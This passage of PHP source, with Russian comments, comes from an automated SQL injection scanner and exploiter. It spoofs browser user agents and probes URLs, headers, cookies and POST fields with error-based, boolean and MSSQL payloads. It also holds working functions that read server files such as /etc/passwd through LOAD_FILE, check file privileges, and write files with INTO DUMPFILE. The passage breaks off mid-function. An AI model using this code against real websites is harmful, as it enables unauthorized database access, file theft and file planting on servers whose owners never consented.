"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; Sgrunt|V109|1746|S-1740532934|dialno; snprtz|dialno; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=; YPC 3.2.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; IEMB3; IEMB3; yplus 5.1.04b)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; FunWebProducts; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; SV1; snprtz|S04087544802137; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; yplus 5.6.02b)");
		
		  ///рандомные значения
		
		  $ua = trim($uagent[mt_rand(0,sizeof($uagent)-1)]);	
		
		if($this->https)
		{
			$url_new = 'https://'.$url;
		}else
		{
			$url_new = 'http://'.$url;
		}
		
		//$this->d($url_new,'$url_new 1');
		curl_setopt( $ch, CURLOPT_HTTPHEADER,$headers); 
		curl_setopt ($ch, CURLOPT_URL,$url_new);
		curl_setopt ($ch, CURLOPT_HEADER, 1);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt ($ch, CURLOPT_FAILONERROR, 1); // Fail on errors
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 20);
		curl_setopt ($ch, CURLOPT_REFERER, "http://google.com");
		curl_setopt ($ch, CURLOPT_USERAGENT, $ua);
		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'coo.txt'); 
		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'coo.txt'); 
		$con = curl_exec($ch); 
		
		curl_close ($ch);
		
		//$this->d($con,'$con 1');
		//exit;
		
		return $con;
		
		
		
		
	
	}
	
	public function form_search($cont){ //глвная по получению формы
		
		$find_form = $this->page_analize('utf-8',$cont);
		
		//$this->d($find_form,'$find_form');
		
		if(count($find_form) >0)
		{
			
			foreach($find_form as $find_form_one)
			{
				$find_form_one = '<form'.$find_form_one.'</form>';
				//$this->d($find_form_one,'$find_form_one');		
				
				
				
				
				$get_form = new HtmlFormParser($find_form_one);
				//$this->d($get_form,'$get_form');
				
				
				$form_in = $get_form->parseForms();
				//$this->d($form_in,'$form_in');
				
				
				if(count($form_in)>0)
				{
					//$this->d('kuku');
					
					$this->global_form[] = $form_in;
				}else{
					
				}
			}	
		}
		return $fff;
		
	}
	
	public function page_analize($charset_http,&$content){//ищем формы на странице	
	

	//1. переводим кодировку в utf-8
	$charset=($this->charset_known($charset_http)?$charset_http:false);
	$charset_meta=false;//сюда поместим указанную
	$this->html_minimize($content);
	$lower=strtolower($content);
	$e=explode('<meta ',$lower);//<meta http-equiv="content-type" content="text/html; charset=utf-8">
	
	if(count($e)>1)
		{
			unset($e[0]);//здесь её точно нет
			foreach($e as &$meta)
			{
				$p=strpos($meta,'>');
				if(false!==$p)
				{
					$meta=substr($meta,0,$p);//http-equiv="content-type" content="text/html; charset=utf-8"
				 if((false!==strpos($meta,'content-type'))&&(false!==strpos($meta,'http-equiv=')))
					{
						$meta_content=$this->get_attr_value($meta,'content');//text/html; charset=utf-8
						if(false!==$meta_content)
						{
							$charset_meta=$this->get_attr_value($meta_content,'charset');//text/html; charset=utf-8
							
							if(false!==$charset_meta)
							{
								if($this->charset_known($charset_meta))
								{
									$charset=$charset_meta;
									break;
								};
							};
						};
					}
				elseif((false!==strpos($meta,'charset')))
					{
						$charset_meta=$this->get_attr_value($meta,'charset');//charset="utf-8"
						if(false!==$charset_meta)
							{
								if($this->charset_known($charset_meta))
								{
									$charset=$charset_meta;
									break;
								};
							};
					};
				};
			};
		unset($meta);
		};
	unset($e);


	//если нашли кодировку, она известна и она не utf-8, то переводим в utf-8
	if((false!==$charset)&&('utf-8'!==$charset))
	{
		$content=@iconv($charset,'utf-8',$content);
		$lower=strtolower($content);
	
	};
	
	//$this->d($lower,'$lower');
	

	//2. ищем форму
	//already - html_minimize($lower);
	$forms=array();
	$e=explode('<form',$lower);
	
	
	if(count($e)>1)
	{
		unset($e[0]);//здесь её точно нет\
		
		
		foreach($e as $form)
		{
			$e2=explode('</form>',$form,3);
			
			//$this->d($e2,'$e2');
			
			if(count($e2) >=1)
			{
				//if(!$this->form_is_search($e2[0]))
				//{
					$forms[]=$e2[0];
				//};
			}
		};
	};
	
	
		unset($e);
		
		//$this->d($forms,'$forms');	
	
		return $forms;
	}

	public function html_minimize(&$s){
		$this->spacer($s);
		static $f=array('> ',' >','< ',' <','/>','<>','= ',' =',);
		static $t=array('>' , '>','<' , '<', '>',''  ,'=' ,'=' ,);
		$l=strlen($s);
		do{
			$l_=$l;
			$s=str_replace($f,$t,$s);
			$l=strlen($s);
		}while($l<$l_);
	}

	public function spacer(&$s){//заменяет все пробельные символы на пробелы. Если пробелов несколько подряд - заменяет одним.
		static $f=array("\t","\n","\r","\v",'&nbsp;','<br>');
		static $t=array(' ',' ',' ',' ',' ',' ');
		$s=str_replace($f,$t,$s);
		$s=trim($s);
		$l=strlen($s);
		do
		{
			$l_=$l;
			$s=str_replace('  ',' ',$s);
			$l=strlen($s);
		}while($l<$l_);
	}	

	public function innerText($in){//нормализованный html_minimize($in)
		static $no_space_tags=array('b','i','u','s','big','span','font','small','strong');
		$e=explode('<',$in);
		$t=$e[0];
		unset($e[0]);
		
		if(count($e)>0)
			{
				foreach($e as &$s)
				{
					$e2=explode('>',$s,2);
					$c=count($e2);
					
					if($c>0)
					{
							//выясняем таг
							$tag=$e2[0];
							$p=strpos($tag,' ');
						
						if(false!==$p)
						{
							$tag=substr($tag,0,$p);
						};
						
						// проверяем теги, которые не надо отделять пробелами
						if(!in_array(strtolower($tag),$no_space_tags))
						{
							$t.=' ';
						};
						
						if(isset($e2[1]))
						{
							$t.=$e2[1];
						};
					}
					else
					{
						//таг не закрыт
					};	
				};
			};
		$this->spacer($t);
		return $t;
	}

	public function charset_known(&$charset){
		
	static $cs=array(
	//Unicode:
		'utf-8','ucs2-internal','iso-10646-ucs-2','unicode-1-1-utf-7',
	//EUC:
		'euc-jp','gb2312','euc-kr','x-euc-tw',
	//ISO-2022:
		'iso-2022-cn','iso-2022-jp','iso-2022-kr','iso-2022-jp-2',
	//ISO:
		'us-ascii','iso-8859-1','iso-8859-2','iso-8859-3','iso-8859-4',
		'iso-8859-5','iso-8859-6','iso-8859-7','iso-8859-8','iso-8859-9',
		'iso-8859-10','iso-8859-13','iso-8859-14','iso-8859-15',
	//KOI:
		'koi8-r','koi8-u','x-koi8-ru',
	//Windows:
		'windows-1250','windows-1251','windows-1252','windows-1253',
		'windows-1254','windows-1255','windows-1256','windows-1257',
		'windows-1258','cp874','cp932','cp936','cp949','cp950',
	//IBM-DOS:
		'cp437','cp737','cp775','cp850','cp852','cp855','cp857','cp860',
		'cp861','cp862','cp863','cp864','cp865','cp866','cp869','cp874',
	//Apple:
		'x-mac-ce','x-mac-croatian','x-mac-cyrillic','x-mac-dingbats',
		'x-mac-greek','x-mac-iceland','x-mac-roman','x-mac-romania',
		'x-mac-thai','x-mac-turkish','x-mac-ukraine',
	//CJK:
		'big5','cns11643','gb_2312-80','gb12345','johab','ksx1001',
		'shift_jis','jis_x0201','jis_x0208-1983','jis_x0212-1990',
		);
		$charset=strtolower($charset);
		return in_array($charset,$cs,true);
	}
		
	public function get_attr_value($s,$attr){//получить значение html-аттрибута. html д.б. нормализован (минимизирован)
		$r=false;
		$n=$attr.'=';
		$p=stripos($s,$n);
		
		if(false!==$p)
		{
			$s=substr($s,$p+strlen($n));
			if(''==$s){$s='';return $s;};

			$q=false;
			
			if('"'===$s[0])
			{
				$q='"';
				$s=substr($s,1);
			}
			elseif('\''===$s[0])
			{
				$q='\'';
				$s=substr($s,1);
			};
			
			if(''==$s){$s='';return $s;};
			
			if(false===$q)
			{
				$p=strpos($s,' ');
				if(false===$p)
				{
					$r=$s;
				}
				else
				{
					$r=substr($s,0,$p);
					if(''==$r){$r='';}
				};
			}
			else
			{
				$p=strpos($s,$q);
				
				if(false===$p)
				{
					$r=$s;
				}
				else
				{
					$r=substr($s,0,$p);
					if(''==$r){$r='';}
				};
			};
		};				
		return $r;
	}
		
	public function str_rand($length=5){
		
		$letters = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890';
	$word_lenght = 5;
	$size_letters = strlen($letters)-1;
	for($i=0;$i<5;$i++){
	while($word_lenght--){
	$pass.=$letters[rand(0,$size_letters)];
	}
	$word_lenght = 5;
	$password =$pass;
	$pass = '';
	}
	$password = substr($password,0,strlen($password)-1);
	return $password;

	}	
		
	public function form_is_search($form){
		//echo pre($form,'$form//form_is_search()');
		$p=strpos($form,'search');
		return(false!==$p);

	}	
	
	
	/////////////////////////////////////////////////////////////////
	/////////АЛГОРИМ НАХОЖДЕНИЯ SQLI на основе анализа слов//////////
	/////////////////////////////////////////////////////////////////
	
	function urlMultiCheckmethod($url=''){
		
		$this->header = false;
		
		$urls = $this->urlParseUrl($url);
		
		
		foreach ($urls as $url_chek)
		{
			
			$chek = $this->urlChekMethod($url_chek);
			
			if($chek!==false)
			{
				$this->header = true;
				//return array($url_chek,$chek);
				return 'boolean';
				break;
			}
			
		}
		
		$this->header = true;
		return false;
		
	}
	
	function urlChekMethod($url){
				
		$this->url = $url;
		$this->method = false;
		//$this->column = false;
		
		$this->mysqlGetKeyword();
		
		//$this->d($this->key_word,'$this->key_word');
		
		$this->mysqlGetMethod();
		
		$this->d($this->method,'$this->method');
		
		if($this->mysqlCheKonec($url)==false)return FALSE;
		
		
		
		if($this->method===0){
	    	return 'integer';
	    	
	    	
	    }elseif ($this->method==1){
	    	
	    	return "string(')";
	    
	    }elseif ($this->method==2){
	    	
	    	return 'string(")';
	    	
	    }else{
	    	return false;
	    }

		die();
	}
	
	function mysqlGetKeyword(){ //ищет уник слова

		
		$cont = $this->getContents($this->url);
		//$this->d($cont,'cont-'.$this->url);
		
		
		$get = $this->getWord($cont);
		//$this->d($get,'get');
		
		
		$contnull = $this->getContents($this->url."2121121121212.1");
		//$this->d($contnull,'contnull-'.$this->url."2121121121212.1");
		
		
		$getnull = $this->getWord($contnull);
		//$this->d($getnull,'getnull');
	
		
		
		$result = array_diff($get,$getnull);
		$result = array_unique($result);
		//$this->d($result,'result');
		
			
		if(count($result)==0){
			
			return false;
		}
		
		
		$result = array_slice($result,0,1); 
		//$this->d($result,'result slice');
		
		$this->key_word = $result[0]; 
		//echo $result;
		//die();
	}
	
	function mysqlGetMethod(){//с разными приставки анализирует вхождение слов, проверка на sqli
		

		if(empty($this->key_word))return FALSE;
		
		///////
		
		$string[0]  = "+and+1%3D1";// and 1=1
		$string[1]  = "+and+1%3E1";//and 1>1
		
		
		$str1 = $this->getContents($this->url.$string[0]);
		$str2 = $this->getContents($this->url.$string[1]);
		

		$i=0;
		
		if(strstr($str1, $this->key_word) AND !strstr($str2, $this->key_word))
		{
			$rezus = 0;
		}else
		{
			$i+=1;
		}
		
		//STRINGE
		
		$string[0]  = "%27+and+%27x%27%3D%27x";//' and 'x'='x
		$string[1]  = "%27+and+%27x%27%3D%27y";//' and 'x'='y
		
		$str1 = $this->getContents($this->url.$string[0]);
		$str2 = $this->getContents($this->url.$string[1]);

		
		if(strstr($str1, $this->key_word) AND !strstr($str2, $this->key_word))
		{
			$rezus = 1;
		}else
		{
			$i+=1;
		}

		
	
		$string[0]  = '"+and+"x"%3D"x'; //" and "x"="x
		$string[1]  = '%22+and+%22x%22%3D%22y';//" and "x"="y
		
		
		$str1 = $this->getContents($this->url.$string[0]);
		$str2 = $this->getContents($this->url.$string[1]);
		
	
	
		if(strstr($str1, $this->key_word) AND !strstr($str2, $this->key_word))
		{
			$rezus = 2;
		}else
		{
			$i+=1;
		}
		
		
		if($i<3)
		{	
			$this->method = $rezus;
			return true;
		}
		
		return FALSE;

	}
	
	function mysqlCheKonec($url){
		
		$file = $this->getContents($url.$this->konec_for_chek[$this->method]);

		if(empty($this->key_word))return false;
		
		if(strstr($file, $this->key_word))return true;
		
		return false;
	}
	
	function getWord($file){//функция отдаёт обратно только чистый текст и помещает в массив с разбивкой по пробелам
		
		
		//<br>
	
		$file = str_replace(array("'",'"',"\r",',','.','-','<br>','</br>'), ' ', $file);
		//preg_match_all("/[^a-zA-Zа-яА-Я0-9]/is",$file,$word);
		$file = explode(' ', $file);
		return $file;
	
	}
	
		/////////////LOAD_FILE//////////////
	
	function upload_file($code,$file){
	
		
		$this->dumpfile = true;

		$this->work[0]=1;
		
		$data = $this->mysqlGetValue('','',"$code",$limit=0,$order=array(),$where="INTO DUMPFILE '$file'");
		
		return $data;
		
		
		
	}
	
	function mysqlDumperFilter($code){
		
		//$code = str_replace("CONCAT(CHAR(100,100,100),CHAR(91,88,93),",'',$code);
		//$code = str_replace(",CHAR(91,88,88,93))",'',$code);
		$code = str_replace("limit 0,1",'',$code);
		$code = str_replace("  INTO",' INTO',$code);
		$code = str_replace("CONCAT(CHAR(100,100,100),CHAR(91,88,93),",'',$code);
		$code = str_replace(",CHAR(91,88,88,93))",'',$code);
		$code = str_replace("CHAR(91,88,93),",'',$code);
		$code = str_replace(",CHAR(91,88,88,93)",'',$code);
		
		$code = trim($code);
		return $code;
		
		
	}
	
	function load_file_priv(){
		
		
		$data = $this->mysqlGetValue('mysql','user','file_priv');
		return $data;
	}
	
	function load_file($pss){
		
	$data = $this->mysqlGetValue('','',"LOAD_FILE('{$pss}')",$limit=0,$order=array(),$where='');
		
		return $data;
		
		
		
	}
	
	function load_file_local($pss){
		
		$pole = "LOAD DATA LOCAL INFILE '{$pss}' INTO TABLE pentest FIELDS TERMINATED BY".' \'\n\'';
		
		$this->d($pole,'$pole');
		//exit;
		
		$data = $this->mysqlGetValue('','',$pole,$limit=0,$order=array(),$where='');
		
		return $data;
		
		//LOAD DATA LOCAL INFILE '/etc/passwd'
		
	}
	
	function load_passwd(){
		
		$load_f = $this->load_file('/etc/passwd');
			
		
			
		if($load_f["LOAD_FILE('/etc/passwd')"] !='')
		{
			
			//$this->d($load_f["LOAD_FILE('/etc/passwd')"],'load_f default');
		}else
		{
			
			//$this->d('NETU','load_f');
			return false;
		}
		$passwd = $load_f["LOAD_FILE('/etc/passwd')"];
		
		$passwd_one = explode("\n",$passwd); 
		//$this->d($passwd_one,'$passwd_one');
		
		if(count($passwd_one) > 5)
		{
			

			$passwd_new = array();
		
			foreach ($passwd_one as $pps)
			{
				
				$pss = trim($pps);
				
			if(!preg_match("/shutdown|sync|cronjob|mysql|root|nginx|mqueue|daemon|clamav|spool/i",$pss)){
					
					
					$pss = str_replace(":/bin/bash",'',$pss);
					$pss = str_replace("::",':',$pss);
					$pss = str_replace(":/bin/sh",':',$pss);
					$pss = str_replace(":/sbin/halt",':',$pss);
					$pss = str_replace(":/bin/false",':',$pss);
					$pss = str_replace(":/sbin/sh",':',$pss);
					$pss = str_replace(":/sbin/bash",':',$pss);
					$pss = str_replace(":/sbin/nologin",':',$pss);
					
					
					$pss_one = explode(":",$pss);
					
					
					
					
				//	$this->d($pss_one,'$pss_one');
					
					$lll6 = 	$pss_one[6];
					$pp_new6 = explode('/',$pss_one[6]);
					
					if(preg_match("/var|home|usr|mnt|opt|nfs/i",$pss_one[6]) and  $pss_one[6] !='' AND count($pp_new6) > 1 )
					{
							
						//$this->d($pss_one[6],'$pss_one6');
						
						if(count($pp_new6) > 3 )
						{
							$passwd_new[] = $pp_new6[0]."/".$pp_new6[1]."/".$pp_new6[2]."/".$pp_new6[3];
						}
						
						if(count($pp_new6) > 4 )
						{
							$passwd_new[] = $pp_new6[0]."/".$pp_new6[1]."/".$pp_new6[2]."/".$pp_new6[3]."/".$pp_new6[4];
						}
						
						if(count($pp_new6) > 5 )
						{
							$passwd_new[] = $pp_new6[0]."/".$pp_new6[1]."/".$pp_new6[2]."/".$pp_new6[3]."/".$pp_new6[4]."/".$pp_new6[5];
						}
						
						if(count($pp_new6) > 6 )
						{
							$passwd_new[] = $pp_new6[0]."/".$pp_new6[1]."/".$pp_new6[2]."/".$pp_new6[3]."/".$pp_new6[4]."/".$pp_new6[5]."/".$pp_new6[6];
						}
						
						
						
							
							$passwd_new[] = $lll6;
												
						
					}
					
					
				
					
					
					
					$lll5 = 	$pss_one[5];
					$pp_new0 = explode('/',$pss_one[5]);
					
					if(preg_match("/var|home|usr|mnt|opt|nfs/i",$pss_one[5]) and  $pss_one[5] !='' AND count($pp_new0) > 1 )
					{
							
					//	$this->d($pss_one[5],'$pss_one5');
						
						if(count($pp_new0) > 3 )
						{
							$passwd_new[] = $pp_new0[0]."/".$pp_new0[1]."/".$pp_new0[2]."/".$pp_new0[3];
						}
						
						if(count($pp_new0) > 4 )
						{
							$passwd_new[] = $pp_new0[0]."/".$pp_new0[1]."/".$pp_new0[2]."/".$pp_new0[3]."/".$pp_new0[4];
						}
						
						if(count($pp_new0) > 5 )
						{
							$passwd_new[] = $pp_new0[0]."/".$pp_new0[1]."/".$pp_new0[2]."/".$pp_new0[3]."/".$pp_new0[4]."/".$pp_new0[5];
						}
						
						if(count($pp_new0) > 6 )
						{
							$passwd_new[] = $pp_new0[0]."/".$pp_new0[1]."/".$pp_new0[2]."/".$pp_new0[3]."/".$pp_new0[4]."/".$pp_new0[5]."/".$pp_new0[6];
						}
						
						
						
							$passwd_new[] = $lll5;
						
						
						
					}
					
					
				
					
					
					
					$lll4 = 	$pss_one[4];
					$pp_new4 = explode('/',$lll4);
					
					if(preg_match("/var|home|usr|mnt|opt|nfs/",$pss_one[4]) AND $pss_one[4] !='' AND count($pp_new4) > 1 )
					{
					
						//$this->d($pss_one[4],'$pss_one4');
						
						if(count($pp_new4) > 3 )
						{
							$passwd_new[] = $pp_new4[0]."/".$pp_new4[1]."/".$pp_new4[2]."/".$pp_new4[3];
						}
						
						if(count($pp_new4) > 4 )
						{
							$passwd_new[] = $pp_new4[0]."/".$pp_new4[1]."/".$pp_new4[2]."/".$pp_new4[3]."/".$pp_new4[4];
						}
						
						if(count($pp_new4) > 5 )
						{
							$passwd_new[] = $pp_new4[0]."/".$pp_new4[1]."/".$pp_new4[2]."/".$pp_new4[3]."/".$pp_new4[4]."/".$pp_new4[5];
						}
						
						
						if(count($pp_new4) > 6 )
						{
							$passwd_new[] = $pp_new4[0]."/".$pp_new4[1]."/".$pp_new4[2]."/".$pp_new4[3]."/".$pp_new4[4]."/".$pp_new4[5]."/".$pp_new4[6];
						}
						
						
							$passwd_new[] = $lll4;
						
					}
					
					
					
					$lll3 = 	$pss_one[3];
					$pp_new3 = explode('/',$pss_one[3]);
					
					
					if(preg_match("/var|home|usr|mnt|opt|nfs/i",$pss_one[3]) and  $pss_one[3] !='' AND count($pp_new3) > 1 )
					{
							
						//$this->d($pss_one[3],'$pss_one3');
						
						if(count($pp_new3) > 3 )
						{
							$passwd_new[] = $pp_new3[0]."/".$pp_new3[1]."/".$pp_new3[2]."/".$pp_new3[3];
						}
						
						if(count($pp_new3) > 4 )
						{
							$passwd_new[] = $pp_new3[0]."/".$pp_new3[1]."/".$pp_new3[2]."/".$pp_new3[3]."/".$pp_new3[4];
						}
						
						if(count($pp_new3) > 5 )
						{
							$passwd_new[] = $pp_new3[0]."/".$pp_new3[1]."/".$pp_new3[2]."/".$pp_new3[3]."/".$pp_new3[4]."/".$pp_new3[5];
						}
						
						if(count($pp_new3) > 6 )
						{
							$passwd_new[] = $pp_new3[0]."/".$pp_new3[1]."/".$pp_new3[2]."/".$pp_new3[3]."/".$pp_new3[4]."/".$pp_new3[5]."/".$pp_new3[6];
						}
						
						
						
							$passwd_new[] = $lll3;
						
						
						
					}
					
					
				}
			}
			
			$passwd_new = array_unique($passwd_new);
			//$this->d($passwd_new,'$passwd_new');
			return $passwd_new;
				
		}
	}
	
	function load_passwd_def(){
		
		return $this->load_file('/etc/passwd');
	}
	
	
	
	////////////////////////////////////////////////////////////////
	/////////////////Первоначальное тестирование ErrorFinder////////
	////////////////////////////////////////////////////////////////
	function inj_test($value='',$sleep=true){ //предварительная фукнция которая разбрасывает куда идет запрос
		$this->head_enable = false; 
	
	
		$this->check_https($value,$this->h_s);
		$value = $this->filter_url($value);
		
		if($this->check_head($value)==true)
		{
			$res = $this->inj_test_head('',$this->h_s);
			return $res;
		}else
		{
			
			$res = $this->inj_test_get($value);
			return $res;
	
			
		}
	
	}
	
	function inj_test_get($value='',$sleep=true){ // errorFinder первоначальная проверка на ошибки mssql mysql
		
		
		
		$value_orig = $value;
		

		$this->value_orig=$value;
		$value_orig = $value;
		$d = $value;
		$d = str_replace('&amp;', "&", $d);
		$d .= "'\"";
		$d = str_replace("&","'&",$d);
			
		
		$this->head_enable=false;
	
		
			
		if (preg_match('/\.asp|\.cfm/si', $d))
		{
			$this->d('asp link');
			
			
			if( $this->inj_test_get_mssql($value_orig))
			{
				$this->mssql = true;
				return 'mssql error';
			}else
			{
				$this->d('false testing_mssql preg');
				$this->mssql = false;
				//return false;
			}
		}
		
		
		
		
		
		
		
		/////Поиск явных ошибок//////
		
			
		$file = $this->getContents($d);
		
		
		if($this->type_sposob_mysql_error==true)
		{
		
			$this->d('type_sposob_mysql_error START');
			foreach ($this->error_text_mysql as $key)
			{
				if(substr_count($file,$key)>0)
				{
					$this->d($d,'URL good mysql');
					return $key;
				}
			}
		
		}
		
		if($file=='')
		{
			$this->d('stop tk error php = 1');	
			return false;
		}
		
		
		
		//////Boolean Based////////
		
		if($this->type_sposob_mysql_boolean==true)
		{
		
		
			$boolean = $this->urlMultiCheckmethod($value_orig);
			//$this->d($boolean,'$boolean');
			
			if($boolean)
			{	
				return $boolean;
			}else
			{
				$this->d('false boolean');
			}
			
		}
		
	
		//стоп метка
		if($this->form_enable)
		{
			
			return false;
		}
		
		
		
		/////time based///////
		if($this->type_sposob_mysql_sqli==true)
		{
			
			
		
			$this->sleep_check1 = true;//только установка sqli
			$this->sleep_check2 = false;//более подробная проверка отключена
		
			$sleep = $this->sqli($value);
			
			if($sleep !== FALSE)
			{
				return $sleep;
			}
			
			
		}	

		
			
			$this->d('false sleep_sqli');
			
			if($this->mysqlFindErrorSql()==true){
				return 'mysqlFindErrorSql';	
			}else{
				$this->d('false mysqlFindErrorSql');
			}
			
			
			if($this->mysqlFindErrorSqlNew()==true){
				return 'mysqlFindErrorSqlNew';	
			}else{
				$this->d('false mysqlFindErrorSqlNew');
			}
			
			
			
			return FALSE;
		
		
		
	}
	
	function inj_test_head($url,$hs){ //Идет и как самостоятельная функция для проверки заголовков в нужном формате так и под подфункция
		
		
		if($hs['url'] !='')$url = $hs['url'];
		$this->check_https($url,$hs);
		$url = $this->filter_url($url);	
		
		$this->value_orig=$url;
		
		
		$this->header = true;
		$this->head_enable=true;
		
		$head = $hs['inject'];
		
		
		
		
		//if($this->form_enable)
		//{
			//$this->d('inj_test_head TRUE !!!!!!!!!!');
			
			//$value = $this->form_set['form_post_act']; // типа при явно проверки с формы передается
			//$query = $this->form_set['form_post_query'];
			
			
			//$this->value_orig=$value;
			//$value_orig = $value;
			
			
			
			
			
			//$d = $query;
			//$d = str_replace('&amp;', "&", $d);
			//$d .= "'\"";
			//$d = str_replace("&","'&",$d);
			
			//$this->form_set['form_post_query'] = $d;
		//}else
		//{
		
		//}
		
		$tmp = parse_url($url);//отпарвляем без http чтобы вытащить чистый url на всякий
		$url =$tmp['path']; 
		//$this->d($tmp,'$tmp22 BEFORE inj_test_get_head');
		//exit;
	
	
		
		
		
		
		
		//$this->d($url,'$url inj_test_get_head');
		//exit;
		if($head == 'useragent')
		{
			$this->method_old =true;
			$this->h_s['useragent'] = 'mozilla';
			$this->h_s['useragent'] .= "'\"";
			
		}elseif($head == 'referer')
		{
			$this->method_old =true;
			$this->h_s['referer'] =   'google.com';
			$this->h_s['referer']    .= "'\"";
			$this->method_old=true;
			
		}elseif($head == 'forwarder')
		{
			$this->method_old =true;
			$this->h_s['forwarder'] = '8.8.8.8';
			$this->h_s['forwarder'] .= "'\"";
			$this->method_old=true;
		}elseif($head == 'post')
		{
			$this->h_s['post_mssql'] =      $hs['post'];
			$this->h_s['post'] =      $hs['post'];
			$this->h_s['post'] = str_replace('&amp;', "&", $this->h_s['post']);
			$this->h_s['post'] .= "'\"";
			$this->h_s['post'] = str_replace("&","'\&",$this->h_s['post']);
			
		}elseif($head == 'cookies')
		{
			
			if($hs['cookies'] !=''){
				$this->h_s['cookies'] =   $hs['cookies'];
					
			}else{
				$this->h_s['cookies'] =   $this->h_s['cookies'];
			}
			
			$this->h_s['cookies'] .= "'\"";
			$this->h_s['cookies'] = str_replace("&","'&",$this->h_s['cookies']);
		}
		
		
		if($hs['cookies_static'] !='')
		{
			$this->h_s['cookies_static'] =   $hs['cookies_static'];
		}
		
		
		
		$this->h_s['post_static'] =  $hs['post_static'];
		
		$this->h_s['sqli'] =  $hs['sqli'];
		
		$this->h_s['inject'] = $head;
		
		$this->h_s['url'] =  $url;
		
		$this->h_s['data'] = $this->h_s[$head];
			
			
		if($this->h_s['data'] !='')
		{
			$url_mssql= $url."?".$this->h_s['post_mssql'];
			
			$url = $url2 = $url."?".$this->h_s['data'];
			
			$url2 = str_replace(array("'",'"','\\'),'',$url2);
			
            if($this->proxy_no_check){
            
            }else{
            
                $this->d($url2,'SQLI ORIG');
            }
			
		}else{
			
			$this->d('HEAD INJECT EMPTY');
			return false;
		}	
		
		
		
		
		
		
		if (preg_match('/\.asp|\.cfm/si', $url_mssql))
		{
			$this->d('ASP link HEAD !!');
			
			
			if( $this->inj_test_get_mssql($url_mssql))
			{
				$this->mssql = true;
				return 'mssql error';
			}else
			{
				$this->d('false testing_mssql preg');
				$this->mssql = false;
				//return false;
			}
		}
		
		
		
		
			/////Поиск явных ошибок//////
        if($this->proxy_no_check){
            
        }else{
            
            $this->d($url,'url AFTER inj_test_get_head');
            $this->d($url2,'url2 AFTER inj_test_get_head'); 
        }   
		
		
		/////////////////////////////////
		
		
		
		
		$file = $this->getContents($url);
		//$this->d($file,'file HEAD');
		//exit;
		//$this->d($this->error_text_mysql,'$this->error_text_mysql');
		//die;
		
		
		if($this->type_sposob_mysql_error_head==true)
		{
		
		
			foreach ($this->error_text_mysql_head as $key)
			{
				if(substr_count($file,$key)>0)
				{
                    
                     if($this->proxy_no_check){
            
                    } else{
                        
                       $this->d($url2,'URL HEAD good mysql:::'. $key);
                    }   
                    
                    
					
					return $key;
					//return $head;
				}
			}
		}
		if($file=='')
		{
			$this->d('stop tk error php = 1');	
			return false;
		}
		
		//return false;
		
		if($this->type_sposob_mysql_sqli_head==true)
		{
			
			$this->sleep_check1 = true;//только установка sqli
			$this->sleep_check2 = false;//более подробная проверка отключена
			
			
			$sleep = $this->sqli_all($url2);
			

			if($sleep !== FALSE)
			{
				return $sleep;
			}else
			{
				return false;
			}
		
		}else{
			
			return false;
		}
		
		
		
		/////////////////////////////////
		
		
		
		
	}
	
	
	
	
	
	function inj_test_get_mssql($value=''){ // errorFinder первоначальная проверка на ошибки mssql
		
		
		$url2 = $this->filter_url($value);
		
		
		

		$urls = $this->urlParseUrl($url2);
		
		//$this->d($urls,'$urls');
		//exit;
		
		
		foreach ($urls as $url_chek)
		{
			
			$len = iconv_strrpos($url_chek,'=');
			//$this->d($len,'$len');
			
			$new_url_chek = substr($url_chek,0,$len+1);
			//$this->d($new_url_chek,'$new_url_chek');
			//exit;
			
			
			$new_check= $new_url_chek;
			
			$new_check = $new_check."%2f**%2fcOnVeRt(int%2c(char(33)%2bchar(126)%2bchar(33)%2b(char(65)%2bchar(66)%2bchar(67)%2bchar(49)%2bchar(52)%2bchar(53)%2bchar(90)%2bchar(81)%2bchar(54)%2bchar(50)%2bchar(68)%2bchar(87)%2bchar(81)%2bchar(65)%2bchar(70)%2bchar(80)%2bchar(79)%2bchar(73)%2bchar(89)%2bchar(67)%2bchar(70)%2bchar(68))%2bchar(33)%2bchar(126)%2bchar(33)))";
			
			
			$file_check = $this->getContents($new_check);
			
			
			
			if(substr_count($file_check,'!~!ABC145ZQ62DWQAFPOIYCFD!~!')>0)
				{
					$this->d($new_check,'!~!ABC145ZQ62DWQAFPOIYCFD!~!');
					return 'mssql error ABC';
				}
			
			
			
			
			
			
			$d = $url_chek;
			$d = str_replace('&amp;', "&", $d);
			$d = str_replace("&","'&",$d);
			$d .= "'0=A";
				//$this->d($d,'d');
			
			
			
		
			
			$file = $this->getContents($d);
			
			
			if($file=='')
			{
				$this->d('stop tk error mssql = 1');	
				return false;
			}

			
			
			foreach ($this->error_text_mssql as $key)
			{

				if(substr_count($file,$key)>0)
				{
					$this->d($url_chek,'good url');
					return $key;
				}
			}
			
			//$this->d($file,'$file');
			//exit;
				
		}	
		
		
		
		
		
		return false;
		

	}
		
	function inj_test_head_mssql($value=''){ // errorFinder первоначальная проверка на ошибки mssql
		
		
		$url2 = $this->filter_url($value);
		
		
		

		$urls = $this->urlParseUrl($url2);
		
		//$this->d($urls,'$urls');
		
		
		
		foreach ($urls as $url_chek)
		{
			
			$len = iconv_strrpos($url_chek,'=');
			//$this->d($len,'$len');
			
			$new_url_chek = substr($url_chek,0,$len+1);
			//$this->d($new_url_chek,'$new_url_chek');
			//exit;
			
			
			$new_check= $new_url_chek;
			
